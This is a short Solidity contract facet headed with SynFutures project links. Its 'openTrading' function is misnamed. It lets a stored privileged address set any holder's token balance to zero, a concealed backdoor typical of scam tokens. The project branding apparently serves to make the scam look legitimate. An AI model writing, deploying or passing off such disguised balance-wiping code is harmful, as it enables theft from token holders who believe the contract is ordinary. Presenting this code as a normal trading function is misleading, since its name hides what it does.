/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.synfutures.com/
 * Whitepaper: https://www.synfutures.com/v3-whitepaper.pdf
 * Twitter: https://twitter.com/SynFuturesDefi
 * Telegram Group: https://t.me/synfutures_Defi
 * Discord Chat: https://discord.com/invite/qMX2kcQk7A
 * Medium: https://medium.com/synfutures
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
